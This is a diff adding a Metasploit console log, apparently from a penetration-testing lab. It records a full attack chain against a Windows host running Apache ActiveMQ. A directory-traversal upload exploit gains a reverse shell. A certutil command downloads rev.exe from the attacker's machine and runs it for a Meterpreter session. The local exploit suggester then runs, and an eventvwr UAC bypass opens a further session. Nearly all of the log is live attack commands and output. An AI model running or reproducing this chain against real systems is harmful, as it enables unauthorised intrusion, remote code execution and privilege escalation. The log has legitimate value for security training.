@@ -1,0 +1,818 @@
+[1m[34m[*][0m Spooling to file msfconsole.log...
+[4mmsf6[0m [0m> pwd
+[0m[1m[34m[*][0m exec: pwd
+
+[4mmsf6[0m [0m> ;[Ksearch apache activemq ta[Krab[Kversal
+[0m
+Matching Modules
+================
+
+   #  Name                                                   Disclosure Date  Rank       Check  Description
+   -  ----                                                   ---------------  ----       -----  -----------
+   0  auxiliary/scanner/http/[45mapache[0m_[45mactivemq[0m_[45mtraversal[0m                        normal     No     [45mApache[0m [45mActiveMQ[0m Directory [45mTraversal[0m
+   1  exploit/windows/http/[45mapache[0m_[45mactivemq[0m_[45mtraversal[0m_upload  2015-08-19       [32mexcellent[0m  Yes    [45mApache[0m [45mActiveMQ[0m 5.x-5.11.1 Directory [45mTraversal[0m Shell Upload
+
+
+Interact with a module by name or index. For example [32minfo 1[0m, [32muse 1[0m or [32muse exploit/windows/http/apache_activemq_traversal_upload[0m
+
+[4mmsf6[0m [0m> use 1
+[0m[1m[34m[*][0m Using configured payload java/jsp_shell_reverse_tcp
+[4mmsf6[0m exploit([1m[31mwindows/http/apache_activemq_traversal_upload[0m) [0m> options
+[0m
+Module options (exploit/windows/http/apache_activemq_traversal_upload):
+
+   Name       Current Setting        Required  Description
+   ----       ---------------        --------  -----------
+   PASSWORD   admin                  yes       Password to authenticate with
+   PATH       /fileserver/..\admin\  yes       Traversal path
+   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.150.150.219         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      8161                   yes       The target port (TCP)
+   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                      yes       The base path to the web application
+   USERNAME   admin                  yes       Username to authenticate with
+   VHOST                             no        HTTP server virtual host
+
+
+Payload options (java/jsp_shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.66.67.46      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+   SHELL                   no        The system shell to use.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Java
+
+
+[4mmsf6[0m exploit([1m[31mwindows/http/apache_activemq_traversal_upload[0m) [0m> show targets
+[0m
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Windows Java
+
+
+[4mmsf6[0m exploit([1m[31mwindows/http/apache_activemq_traversal_upload[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.66.67.46:4444 
+[1m[34m[*][0m Uploading payload...
+[1m[34m[*][0m Payload sent. Attempting to execute the payload.
+[1m[32m[+][0m Payload executed!
+[1m[34m[*][0m Command shell session 2 opened (10.66.67.46:4444 -> 10.150.150.219:49326) at 2021-02-26 00:04:39 +0100
+
+[0m
+C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin>
+Background session 2? [y/N]  [4mmsf6[0m exploit([1m[31mwindows/http/apache_activemq_traversal_upload[0m) [0m> options
+[0m
+Module options (exploit/windows/http/apache_activemq_traversal_upload):
+
+   Name       Current Setting        Required  Description
+   ----       ---------------        --------  -----------
+   PASSWORD   admin                  yes       Password to authenticate with
+   PATH       /fileserver/..\admin\  yes       Traversal path
+   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.150.150.219         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      8161                   yes       The target port (TCP)
+   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                      yes       The base path to the web application
+   USERNAME   admin                  yes       Username to authenticate with
+   VHOST                             no        HTTP server virtual host
+
+
+Payload options (java/jsp_shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.66.67.46      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+   SHELL                   no        The system shell to use.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Java
+
+
+[4mmsf6[0m exploit([1m[31mwindows/http/apache_activemq_traversal_upload[0m) [0m> set paylow[Kad windows/meterpreter/reverse_tcp
+[0mpayload => windows/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mwindows/http/apache_activemq_traversal_upload[0m) [0m> options
+[0m
+Module options (exploit/windows/http/apache_activemq_traversal_upload):
+
+   Name       Current Setting        Required  Description
+   ----       ---------------        --------  -----------
+   PASSWORD   admin                  yes       Password to authenticate with
+   PATH       /fileserver/..\admin\  yes       Traversal path
+   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.150.150.219         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      8161                   yes       The target port (TCP)
+   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                      yes       The base path to the web application
+   USERNAME   admin                  yes       Username to authenticate with
+   VHOST                             no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.66.67.46      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Java
+
+
+[4mmsf6[0m exploit([1m[31mwindows/http/apache_activemq_traversal_upload[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.66.67.46:4444 
+[1m[34m[*][0m Uploading payload...
+[1m[34m[*][0m Payload sent. Attempting to execute the payload.
+[1m[31m[-][0m Exploit aborted due to failure: payload-failed: Failed to execute the payload
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mwindows/http/apache_activemq_traversal_upload[0m) [0m> sessions[K[K[K[K[K[K[K[Ksessions 1
+[0m[1m[31m[-][0m Invalid session identifier: 1
+[4mmsf6[0m exploit([1m[31mwindows/http/apache_activemq_traversal_upload[0m) [0m> sessions 1[C[P 1
+[0m[1m[31m[-][0m Unknown command: session.
+[4mmsf6[0m exploit([1m[31mwindows/http/apache_activemq_traversal_upload[0m) [0m> session 1s 1[C[C[K
+[0m
+Active sessions
+===============
+
+  Id  Name  Type              Information                                                                       Connection
+  --  ----  ----              -----------                                                                       ----------
+  2         shell java/linux  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.66.67.46:4444 -> 10.150.150.219:49326 (10.150.150.219)
+
+[4mmsf6[0m exploit([1m[31mwindows/http/apache_activemq_traversal_upload[0m) [0m> sessions 2
+[0m[1m[34m[*][0m Starting interaction with 2...
+
+
+C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin>whoami
+hollywood\user
+
+C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin>curl
+
+C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin>cd C:
+C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin
+
+C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin>cd C:\
+
+C:\>cd Users/Public
+
+C:\Users\Public>ls
+
+C:\Users\Public>cd Downloads
+
+C:\Users\Public\Downloads>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 021A-9C32
+
+ Directory of C:\Users\Public\Downloads
+
+07/14/2009  12:41 PM    <DIR>          .
+07/14/2009  12:41 PM    <DIR>          ..
+               0 File(s)              0 bytes
+               2 Dir(s)  44,515,057,664 bytes free
+
+C:\Users\Public\Downloads>certutil -urlcache -f http://10.66.67.46/rev.exe rev.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\Public\Downloads>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 021A-9C32
+
+ Directory of C:\Users\Public\Downloads
+
+02/26/2021  08:12 AM    <DIR>          .
+02/26/2021  08:12 AM    <DIR>          ..
+02/26/2021  08:12 AM            73,802 rev.exe
+               1 File(s)         73,802 bytes
+               2 Dir(s)  44,514,246,656 bytes free
+
+C:\Users\Public\Downloads>./rev.exe
+
+C:\Users\Public\Downloads>
+Background session 2? [y/N]  [4mmsf6[0m exploit([1m[31mwindows/http/apache_activemq_traversal_upload[0m) [0m> search multi/[K[K[K[K[K[Khandler
+[0m
+Matching Modules
+================
+
+   #   Name                                                           Disclosure Date  Rank       Check  Description
+   -   ----                                                           ---------------  ----       -----  -----------
+   0   auxiliary/admin/http/wp_gdpr_compliance_privesc                2018-11-08       normal     Yes    WordPress WP GDPR Compliance Plugin Privilege Escalation
+   1   auxiliary/dos/http/metasploit_http[45mhandler[0m_dos                  2019-09-04       normal     No     Metasploit HTTP(S) [45mhandler[0m DoS
+   2   auxiliary/dos/http/webrick_regex                               2008-08-08       normal     No     Ruby WEBrick::HTTP::DefaultFile[45mHandler[0m DoS
+   3   auxiliary/dos/misc/ibm_tsm_dos                                 2015-12-15       normal     No     IBM Tivoli Storage Manager FastBack Server Opcode 0x534 Denial of Service
+   4   auxiliary/gather/eventlog_cred_disclosure                      2014-11-05       normal     No     ManageEngine Eventlog Analyzer Managed Hosts Administrator Credential Disclosure
+   5   auxiliary/scanner/http/apache_activemq_source_disclosure                        normal     No     Apache ActiveMQ JSP Files Source Disclosure
+   6   auxiliary/scanner/http/apache_activemq_traversal                                normal     No     Apache ActiveMQ Directory Traversal
+   7   auxiliary/scanner/http/apache_mod_cgi_bash_env                 2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
+   8   auxiliary/server/dns/native_server                                              normal     No     Native DNS Server (Example)
+   9   auxiliary/server/teamviewer_uri_smb_redirect                                    normal     No     TeamViewer Unquoted URI [45mHandler[0m SMB Redirect
+   10  exploit/android/browser/samsung_knox_smdm_url                  2014-11-12       [32mexcellent[0m  No     Samsung Galaxy KNOX Android Browser RCE
+   11  exploit/android/local/janus                                    2017-07-31       manual     Yes    Android Janus APK Signature bypass
+   12  exploit/freebsd/misc/citrix_netscaler_soap_bof                 2014-09-22       normal     Yes    Citrix NetScaler SOAP [45mHandler[0m Remote Code Execution
+   13  exploit/freebsd/telnet/telnet_encrypt_keyid                    2011-12-23       [32mgreat[0m      No     FreeBSD Telnet Service Encryption Key ID Buffer Overflow
+   14  exploit/linux/http/accellion_fta_getstatus_oauth               2015-07-10       [32mexcellent[0m  Yes    Accellion FTA getStatus verify_oauth_token Command Execution
+   15  exploit/linux/http/dlink_dspw215_info_cgi_bof                  2014-05-22       normal     Yes    D-Link info.cgi POST Request Buffer Overflow
+   16  exploit/linux/http/dlink_hnap_bof                              2014-05-15       normal     Yes    D-Link HNAP Request Remote Buffer Overflow
+   17  exploit/linux/http/netgear_readynas_exec                       2013-07-12       manual     Yes    NETGEAR ReadyNAS Perl Code Evaluation
+   18  exploit/linux/http/raidsonic_nas_ib5220_exec_noauth            2013-02-04       manual     No     Raidsonic NAS Devices Unauthenticated Remote Command Execution
+   19  exploit/linux/http/rconfig_ajaxarchivefiles_rce                2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
+   20  exploit/linux/http/trendmicro_websecurity_exec                 2020-06-10       [32mexcellent[0m  Yes    Trend Micro Web Security (Virtual Appliance) Remote Code Execution
+   21  exploit/linux/local/abrt_raceabrt_priv_esc                     2015-04-14       [32mexcellent[0m  Yes    ABRT raceabrt Privilege Escalation
+   22  exploit/linux/local/abrt_sosreport_priv_esc                    2015-11-23       [32mexcellent[0m  Yes    ABRT sosreport Privilege Escalation
+   23  exploit/linux/local/apport_abrt_chroot_priv_esc                2015-03-31       [32mexcellent[0m  Yes    Apport / ABRT chroot Privilege Escalation
+   24  exploit/linux/local/apt_package_manager_persistence            1999-03-09       [32mexcellent[0m  No     APT Package Manager Persistence
+   25  exploit/linux/local/bash_profile_persistence                   1989-06-08       normal     No     Bash Profile Persistence
+   26  exploit/linux/local/blueman_set_dhcp_[45mhandler[0m_dbus_priv_esc     2015-12-18       [32mexcellent[0m  Yes    blueman set_dhcp_[45mhandler[0m D-Bus Privilege Escalation
+   27  exploit/linux/local/desktop_privilege_escalation               2014-08-07       [32mexcellent[0m  Yes    Desktop Linux Password Stealer and Privilege Escalation
+   28  exploit/linux/local/yum_package_manager_persistence            2003-12-17       [32mexcellent[0m  No     Yum Package Manager Persistence
+   29  exploit/linux/telnet/telnet_encrypt_keyid                      2011-12-23       [32mgreat[0m      No     Linux BSD-derived Telnet Service Encryption Key ID Buffer Overflow
+   30  exploit/multi/[45mhandler[0m                                                           manual     No     Generic Payload [45mHandler[0m
+   31  exploit/multi/http/hp_sitescope_uploadfiles[45mhandler[0m             2012-08-29       good       No     HP SiteScope Remote Code Execution
+   32  exploit/multi/http/maracms_upload_exec                         2020-08-31       [32mexcellent[0m  Yes    MaraCMS Arbitrary PHP File Upload
+   33  exploit/multi/http/wp_ait_csv_rce                              2020-11-14       [32mexcellent[0m  Yes    WordPress AIT CSV Import Export Unauthenticated Remote Code Execution
+   34  exploit/osx/browser/safari_user_assisted_download_launch       2014-03-10       manual     No     Safari User-Assisted Download and Run Attack
+   35  exploit/unix/webapp/guestbook_ssi_exec                         1999-11-05       [32mexcellent[0m  No     Matt Wright guestbook.pl Arbitrary Command Execution
+   36  exploit/unix/webapp/jquery_file_upload                         2018-10-09       [32mexcellent[0m  Yes    blueimp's jQuery (Arbitrary) File Upload
+   37  exploit/unix/webapp/wp_photo_gallery_unrestricted_file_upload  2014-11-11       [32mexcellent[0m  Yes    WordPress Photo Gallery Unrestricted File Upload
+   38  exploit/windows/browser/aim_goaway                             2004-08-09       [32mgreat[0m      No     AOL Instant Messenger goaway Overflow
+   39  exploit/windows/browser/exodus                                 2018-01-25       manual     No     Exodus Wallet (ElectronJS Framework) remote Code Execution
+   40  exploit/windows/browser/ie_setmousecapture_uaf                 2013-09-17       normal     No     MS13-080 Microsoft Internet Explorer SetMouseCapture Use-After-Free
+   41  exploit/windows/browser/ms05_054_onload                        2005-11-21       normal     No     MS05-054 Microsoft Internet Explorer JavaScript OnLoad [45mHandler[0m Remote Code Execution
+   42  exploit/windows/browser/ms10_042_helpctr_xss_cmd_exec          2010-06-09       [32mexcellent[0m  No     Microsoft Help Center XSS and Command Execution
+   43  exploit/windows/browser/ms13_055_canchor                       2013-07-09       normal     No     MS13-055 Microsoft Internet Explorer CAnchorElement Use-After-Free
+   44  exploit/windows/browser/ms13_059_cflatmarkuppointer            2013-06-27       normal     No     MS13-059 Microsoft Internet Explorer CFlatMarkupPointer Use-After-Free
+   45  exploit/windows/browser/ms13_069_caret                         2013-09-10       normal     No     MS13-069 Microsoft Internet Explorer CCaret Use-After-Free
+   46  exploit/windows/browser/ms13_080_cdisplaypointer               2013-10-08       normal     No     MS13-080 Microsoft Internet Explorer CDisplayPointer Use-After-Free
+   47  exploit/windows/browser/notes_[45mhandler[0m_cmdinject                2012-06-18       [32mexcellent[0m  No     IBM Lotus Notes Client URL [45mHandler[0m Command Injection
+   48  exploit/windows/browser/persits_xupload_traversal              2009-09-29       [32mexcellent[0m  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
+   49  exploit/windows/fileformat/cyberlink_lpp_bof                   2017-09-23       normal     No     CyberLink LabelPrint 2.5 Stack Buffer Overflow
+   50  exploit/windows/fileformat/cyberlink_p2g_bof                   2011-09-12       [32mgreat[0m      No     CyberLink Power2Go name Attribute (p2g) Stack Buffer Overflow Exploit
+   51  exploit/windows/fileformat/foxit_title_bof                     2010-11-13       [32mgreat[0m      No     Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow
+   52  exploit/windows/fileformat/magix_musikmaker_16_mmm             2011-04-26       good       No     Magix Musik Maker 16 .mmm Stack Buffer Overflow
+   53  exploit/windows/fileformat/ms14_060_sandworm                   2014-10-14       [32mexcellent[0m  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   54  exploit/windows/fileformat/nuance_pdf_launch_overflow          2010-10-08       [32mgreat[0m      No     Nuance PDF Reader v6.0 Launch Stack Buffer Overflow
+   55  exploit/windows/fileformat/office_word_hta                     2017-04-14       [32mexcellent[0m  No     Microsoft Office Word Malicious Hta Execution
+   56  exploit/windows/fileformat/xion_m3u_sehbof                     2010-11-23       [32mgreat[0m      No     Xion Audio Player 1.0.126 Unicode Stack Buffer Overflow
+   57  exploit/windows/fileformat/zahir_enterprise_plus_csv           2018-09-28       normal     No     Zahir Enterprise Plus 6 Stack Buffer Overflow
+   58  exploit/windows/firewall/blackice_pam_icq                      2004-03-18       [32mgreat[0m      No     ISS PAM.dll ICQ Parser Buffer Overflow
+   59  exploit/windows/ftp/aasync_list_reply                          2010-10-12       good       No     AASync v2.2.1.0 (Win32) Stack Buffer Overflow (LIST)
+   60  exploit/windows/ftp/ftpgetter_pwd_reply                        2010-10-12       good       No     FTPGetter Standard v3.55.0.05 Stack Buffer Overflow (PWD)
+   61  exploit/windows/ftp/ftpshell51_pwd_reply                       2010-10-12       good       No     FTPShell 5.1 Stack Buffer Overflow
+   62  exploit/windows/ftp/ftpsynch_list_reply                        2010-10-12       good       No     FTP Synchronizer Professional 4.0.73.274 Stack Buffer Overflow
+   63  exploit/windows/ftp/gekkomgr_list_reply                        2010-10-12       good       No     Gekko Manager FTP Client Stack Buffer Overflow
+   64  exploit/windows/ftp/odin_list_reply                            2010-10-12       good       No     Odin Secure FTP 4.1 Stack Buffer Overflow (LIST)
+   65  exploit/windows/ftp/scriptftp_list                             2011-10-12       good       No     ScriptFTP LIST Remote Buffer Overflow
+   66  exploit/windows/ftp/seagull_list_reply                         2010-10-12       good       No     Seagull FTP v3.3 Build 409 Stack Buffer Overflow
+   67  exploit/windows/http/bea_weblogic_transfer_encoding            2008-09-09       [32mgreat[0m      No     BEA Weblogic Transfer-Encoding Buffer Overflow
+   68  exploit/windows/http/integard_password_bof                     2010-09-07       [32mgreat[0m      No     Race River Integard Home/Pro LoginAdmin Password Stack Buffer Overflow
+   69  exploit/windows/http/ultraminihttp_bof                         2013-07-10       normal     No     Ultra Mini HTTPD Stack Buffer Overflow
+   70  exploit/windows/iis/ms01_033_idq                               2001-06-18       good       No     MS01-033 Microsoft IIS 5.0 IDQ Path Overflow
+   71  exploit/windows/local/bypassuac_comhijack                      1900-01-01       [32mexcellent[0m  Yes    Windows Escalate UAC Protection Bypass (Via COM [45mHandler[0m Hijack)
+   72  exploit/windows/local/bypassuac_sluihijack                     2018-01-15       [32mexcellent[0m  Yes    Windows UAC Protection Bypass (Via Slui File [45mHandler[0m Hijack)
+   73  exploit/windows/local/ps_wmi_exec                              2012-08-19       [32mexcellent[0m  No     Authenticated WMI Exec via Powershell
+   74  exploit/windows/local/razer_zwopenprocess                      2017-03-22       normal     Yes    Razer Synapse rzpnk.sys ZwOpenProcess
+   75  exploit/windows/misc/achat_bof                                 2014-12-18       normal     No     Achat Unicode SEH Buffer Overflow
+   76  exploit/windows/misc/hp_dataprotector_new_folder               2012-03-12       normal     No     HP Data Protector Create New Folder Buffer Overflow
+   77  exploit/windows/misc/stream_down_bof                           2011-12-27       good       No     CoCSoft StreamDown 6.8.0 Buffer Overflow
+   78  exploit/windows/misc/trendmicro_cmdprocessor_addtask           2011-12-07       good       No     TrendMicro Control Manger CmdProcessor.exe Stack Buffer Overflow
+   79  exploit/windows/mssql/mssql_linkcrawler                        2000-01-01       [32mgreat[0m      No     Microsoft SQL Server Database Link Crawling Command Execution
+
+
+Interact with a module by name or index. For example [32minfo 79[0m, [32muse 79[0m or [32muse exploit/windows/mssql/mssql_linkcrawler[0m
+
+[4mmsf6[0m exploit([1m[31mwindows/http/apache_activemq_traversal_upload[0m) [0m> search handlermhandleruhandlerlhandlerthandlerihandler/handler
+[0m
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
+   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
+   2  exploit/linux/local/apt_package_manager_persistence  1999-03-09       [32mexcellent[0m  No     APT Package Manager Persistence
+   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
+   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       [32mexcellent[0m  Yes    Desktop Linux Password Stealer and Privilege Escalation
+   5  exploit/linux/local/yum_package_manager_persistence  2003-12-17       [32mexcellent[0m  No     Yum Package Manager Persistence
+   6  exploit/[45mmulti/handler[0m                                                 manual     No     Generic Payload Handler
+   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       [32mexcellent[0m  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
+   8  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       [32mgreat[0m      No     Microsoft SQL Server Database Link Crawling Command Execution
+
+
+Interact with a module by name or index. For example [32minfo 8[0m, [32muse 8[0m or [32muse exploit/windows/mssql/mssql_linkcrawler[0m
+
+[4mmsf6[0m exploit([1m[31mwindows/http/apache_activemq_traversal_upload[0m) [0m> use 6
+[0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcp
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> optins[K[Kons
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> set LHOST tun0
+[0mLHOST => 10.66.67.46
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> set payload windows/meterpretr[Ker/reverse_tcp
+[0mpayload => windows/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> run -j
+[0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[31m[-][0m Handler failed to bind to 10.66.67.46:4444:-  -
+[1m[31m[-][0m Handler failed to bind to 0.0.0.0:4444:-  -
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> [1m[31m[-][0m Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
+run -j
+[0m[1m[34m[*][0m Exploit running as background job 1.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[34m[*][0m Started reverse TCP handler on 10.66.67.46:4444 
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type              Information                                                                       Connection
+  --  ----  ----              -----------                                                                       ----------
+  2         shell java/linux  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.66.67.46:4444 -> 10.150.150.219:49326 (10.150.150.219)
+
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> session
+[K[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> session
+[K[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> session
+[K[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> sessions 2
+[0m[1m[34m[*][0m Starting interaction with 2...
+
+
+C:\Users\Public\Downloads>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 021A-9C32
+
+ Directory of C:\Users\Public\Downloads
+
+02/26/2021  08:12 AM    <DIR>          .
+02/26/2021  08:12 AM    <DIR>          ..
+02/26/2021  08:12 AM            73,802 rev.exe
+               1 File(s)         73,802 bytes
+               2 Dir(s)  44,514,250,752 bytes free
+
+C:\Users\Public\Downloads>./rev.exe
+
+C:\Users\Public\Downloads>rev.exe
+
+C:\Users\Public\Downloads>
+[1m[34m[*][0m Sending stage (175174 bytes) to 10.150.150.219
+[1m[34m[*][0m Meterpreter session 3 opened (10.66.67.46:4444 -> 10.150.150.219:49335) at 2021-02-26 00:22:19 +0100
+[0m[0m
+C:\Users\Public\Downloads>
+Background session 2? [y/N]  [4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                                                       Connection
+  --  ----  ----                     -----------                                                                       ----------
+  2         shell java/linux         Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.66.67.46:4444 -> 10.150.150.219:49326 (10.150.150.219)
+  3         meterpreter x86/windows  HOLLYWOOD\User @ HOLLYWOOD                                                        10.66.67.46:4444 -> 10.150.150.219:49335 (10.150.150.219)
+
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> search suggester
+[0m
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_[45msuggester[0m                   normal  No     Multi Recon Local Exploit [45mSuggester[0m
+
+
+Interact with a module by name or index. For example [32minfo 0[0m, [32muse 0[0m or [32muse post/multi/recon/local_exploit_suggester[0m
+
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> use 0
+[0m[4mmsf6[0m post([1m[31mmulti/recon/local_exploit_suggester[0m) [0m> options
+[0m
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION          1                yes       The session to run this module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+[4mmsf6[0m post([1m[31mmulti/recon/local_exploit_suggester[0m) [0m> set SESSION 3
+[0mSESSION => 3
+[4mmsf6[0m post([1m[31mmulti/recon/local_exploit_suggester[0m) [0m> run
+[0m
+[1m[34m[*][0m 10.150.150.219 - Collecting local exploits for x86/windows...
+[1m[34m[*][0m 10.150.150.219 - 37 exploit checks are being tried...
+[1m[32m[+][0m 10.150.150.219 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[1m[32m[+][0m 10.150.150.219 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[1m[32m[+][0m 10.150.150.219 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[1m[32m[+][0m 10.150.150.219 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[1m[32m[+][0m 10.150.150.219 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[1m[31m[-][0m 10.150.150.219 - Post interrupted by the console user
+[1m[34m[*][0m Post module execution completed
+[4mmsf6[0m post([1m[31mmulti/recon/local_exploit_suggester[0m) [0m> use exploit/windows/local/bypassuac_eventvwr
+[0m[1m[34m[*][0m No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> options
+[0m
+Module options (exploit/windows/local/bypassuac_eventvwr):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     172.18.191.230   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> set LHOST[C tun0
+[0mLHOST => tun0
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> set LPORT 5555
+[0mLPORT => 5555
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> set[K[K[Kset LPORT 5555HOST tun0[P[P[P[P[P[P[Poptionsuse exploit/windows/local/bypassuac_eventvwrrun[Kset SESSION 3
+[0mSESSION => 3
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.66.67.46:5555 
+[1m[34m[*][0m UAC is Enabled, checking level...
+[1m[32m[+][0m Part of Administrators group! Continuing...
+[1m[32m[+][0m UAC is set to Default
+[1m[32m[+][0m BypassUAC can bypass this setting, continuing...
+[1m[34m[*][0m Configuring payload and stager registry keys ...
+[1m[34m[*][0m Executing payload: C:\Windows\System32\eventvwr.exe
+[1m[32m[+][0m eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
+[1m[34m[*][0m Sending stage (175174 bytes) to 10.150.150.219
+[1m[34m[*][0m Meterpreter session 4 opened (10.66.67.46:5555 -> 10.150.150.219:49338) at 2021-02-26 00:24:50 +0100
+[0m[1m[34m[*][0m Cleaning up registry keys ...
+
+[0m[4mmeterpreter[0m > [0mgetuid
+[0mServer username: HOLLYWOOD\User
+[4mmeterpreter[0m > background
+[0m[1m[34m[*][0m Backgrounding session 4...
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                                                       Connection
+  --  ----  ----                     -----------                                                                       ----------
+  2         shell java/linux         Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.66.67.46:4444 -> 10.150.150.219:49326 (10.150.150.219)
+  3         meterpreter x86/windows  HOLLYWOOD\User @ HOLLYWOOD                                                        10.66.67.46:4444 -> 10.150.150.219:49335 (10.150.150.219)
